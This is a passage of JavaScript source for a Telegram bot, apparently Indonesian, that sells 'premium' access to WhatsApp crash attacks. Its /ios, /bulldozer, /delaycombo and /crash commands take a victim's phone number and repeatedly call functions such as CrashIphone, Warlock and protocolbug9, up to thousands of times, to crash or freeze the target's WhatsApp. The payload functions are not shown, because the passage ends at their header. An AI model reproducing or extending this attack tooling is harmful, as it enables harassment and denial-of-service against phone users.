│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛
┏─────────────────────┓
│ Create By : @Falxz
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });
});
bot.onText(/\/ios (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tanpa Username";
  const targetNumber = match[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Cek premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const warningImage = getRandomImage(); // Fungsi kamu untuk ambil gambar acak
    return bot.sendPhoto(chatId, warningImage, {
      caption: `
 <pre>only for premium users</pre>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🚀 Upgrade Premium", url: "https://t.me/Falxz" }],
          [
            { text: "📡 Info Chanel", url: "https://t.me/TwelveFortunes" },
            { text: "🛰 Group Umum", url: "https://t.me/MarketPlaceFal" },
          ]
        ]
      }
    });
  }

  // Cek sesi aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *Sesi WhatsApp Tidak Aktif!*
Gunakan perintah: /connect untuk pairing sesi baru.
`, { parse_mode: "Markdown" });
  }

  // Validasi nomor target
  if (!match[1] || match[1].length < 8) {
    return bot.sendMessage(chatId, `
⚠️ *Format Salah!*
Gunakan format: /NeuroToxinBlast 628xxxxxx
`, { parse_mode: "Markdown" });
  }

  // Eksekusi bug
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴇɴᴅɪɴɢ ʙᴜɢs... 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });

  // Fungsi bug jalan di sini (simulasi)
  const jeda = ms => new Promise(res => setTimeout(res, ms));
  for (let i = 0; i < 300; i++) {
  await iosinVisFC(targetNumber);
  await jeda(1000);
  }

  // Notif setelah selesai
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴜᴄᴄᴇsғᴜʟʟʏ sᴇɴᴅ ʙᴜɢ 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛
┏─────────────────────┓
│ Create By : @Falxz
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });
});
bot.onText(/\/bulldozer (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tanpa Username";
  const targetNumber = match[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Cek premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const warningImage = getRandomImage(); // Fungsi kamu untuk ambil gambar acak
    return bot.sendPhoto(chatId, warningImage, {
      caption: `
 <pre>only for premium users</pre>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🚀 Upgrade Premium", url: "https://t.me/Falxz" }],
          [
            { text: "📡 Info Chanel", url: "https://t.me/TwelveFortunes" },
            { text: "🛰 Group Umum", url: "https://t.me/MarketPlaceFal" },
          ]
        ]
      }
    });
  }

  // Cek sesi aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *Sesi WhatsApp Tidak Aktif!*
Gunakan perintah: /connect untuk pairing sesi baru.
`, { parse_mode: "Markdown" });
  }

  // Validasi nomor target
  if (!match[1] || match[1].length < 8) {
    return bot.sendMessage(chatId, `
⚠️ *Format Salah!*
Gunakan format: /NeuroToxinBlast 628xxxxxx
`, { parse_mode: "Markdown" });
  }

  // Eksekusi bug
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴇɴᴅɪɴɢ ʙᴜɢs... 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛.</pre>
`, { parse_mode: "HTML" });

  // Fungsi bug jalan di sini (simulasi)
  const jeda = ms => new Promise(res => setTimeout(res, ms));
  for (let i = 0; i < 300; i++) {
  await Warlock(targetNumber);
  await jeda(1000);
  }
  await Warlock(targetNumber);

  // Notif setelah selesai
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴜᴄᴄᴇsғᴜʟʟʏ sᴇɴᴅ ʙᴜɢ 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛
┏─────────────────────┓
│ Create By : @Falxz
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });
});
bot.onText(/\/delaycombo (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tanpa Username";
  const targetNumber = match[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const whatitsdhes = targetNumber

  // Cek premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const warningImage = getRandomImage(); // Fungsi kamu untuk ambil gambar acak
    return bot.sendPhoto(chatId, warningImage, {
      caption: `
 <pre>only for premium users</pre>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🚀 Upgrade Premium", url: "https://t.me/Falxz" }],
          [
            { text: "📡 Info Chanel", url: "https://t.me/TwelveFortunes" },
            { text: "🛰 Group Umum", url: "https://t.me/MarketPlaceFal" },
          ]
        ]
      }
    });
  }

  // Cek sesi aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *Sesi WhatsApp Tidak Aktif!*
Gunakan perintah: /connect untuk pairing sesi baru.
`, { parse_mode: "Markdown" });
  }

  // Validasi nomor target
  if (!match[1] || match[1].length < 8) {
    return bot.sendMessage(chatId, `
⚠️ *Format Salah!*
Gunakan format: /NeuroToxinBlast 628xxxxxx
`, { parse_mode: "Markdown" });
  }

  // Eksekusi bug
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴇɴᴅɪɴɢ ʙᴜɢs... 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });

  // Fungsi bug jalan di sini (simulasi)
  const jeda = ms => new Promise(res => setTimeout(res, ms));
  for (let i = 0; i < 30000; i++) {
  await trashprotocol(whatitsdhes);
  await jeda(2000);
  await protocolbug6(whatitsdhes);
  await jeda(2000);
  await protocolbug9(whatitsdhes);
  await jeda(2000);
  await BlackHexDelayNew(whatitsdhes);
  await jeda(2000);
  await WhatitsdhesDelay(whatitsdhes);
  await jeda(2000);
  await whatitsdhesCallInvisible(whatitsdhes);
  await VisibleNullRemake(whatitsdhes);
  }

  // Notif setelah selesai
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴜᴄᴄᴇsғᴜʟʟʏ sᴇɴᴅ ʙᴜɢ 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛
┏─────────────────────┓
│ Create By : @Falxz
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });
});
bot.onText(/\/crash (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const username = msg.from.username ? `@${msg.from.username}` : "Tanpa Username";
  const targetNumber = match[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  // Cek premium
  if (!premiumUsers.some(u => u.id === userId && new Date(u.expiresAt) > new Date())) {
    const warningImage = getRandomImage(); // Fungsi kamu untuk ambil gambar acak
    return bot.sendPhoto(chatId, warningImage, {
      caption: `
 <pre>only for premium users</pre>
      `,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "🚀 Upgrade Premium", url: "https://t.me/Falxz" }],
          [
            { text: "📡 Info Chanel", url: "https://t.me/TwelveFortunes" },
            { text: "🛰 Group Umum", url: "https://t.me/MarketPlaceFal" },
          ]
        ]
      }
    });
  }

  // Cek sesi aktif
  if (sessions.size === 0) {
    return bot.sendMessage(chatId, `
⚠️ *Sesi WhatsApp Tidak Aktif!*
Gunakan perintah: /connect untuk pairing sesi baru.
`, { parse_mode: "Markdown" });
  }

  // Validasi nomor target
  if (!match[1] || match[1].length < 8) {
    return bot.sendMessage(chatId, `
⚠️ *Format Salah!*
Gunakan format: /NeuroToxinBlast 628xxxxxx
`, { parse_mode: "Markdown" });
  }

  // Eksekusi bug
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴇɴᴅɪɴɢ ʙᴜɢs... 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });

  // Fungsi bug jalan di sini (simulasi)
  const jeda = ms => new Promise(res => setTimeout(res, ms));
  for (let i = 0; i < 55; i++) {
  await WhatitsdhesBlankNew(targetNumber);
  await jeda(1000);
  await CrashIphone(targetNumber);
  await jeda(1000);
  await BlankNew(targetNumber);
  }
  await Warlock(targetNumber);

  // Notif setelah selesai
  bot.sendMessage(chatId, `
<pre>┏─── ༽ 𝐍𝐎𝐓𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍 ༼ ────┓
│ Sᴛᴀᴛᴜs : sᴜᴄᴄᴇsғᴜʟʟʏ sᴇɴᴅ ʙᴜɢ 
│ Nᴏᴛᴇ : ᴊᴇᴅᴀ 𝟻ᴍɴᴛ ʏᴀ ᴅᴇᴋ ʙɪᴀʀ
│ ɴᴏᴍᴏʀ sᴇɴᴅᴇʀ ɢᴋ ᴋᴇ ʙᴀɴɴᴇᴅ
┗─────────────────────┛
┏─────────────────────┓
│ Create By : @Falxz
┗─────────────────────┛</pre>
`, { parse_mode: "HTML" });
});

//// FUNCTION ////
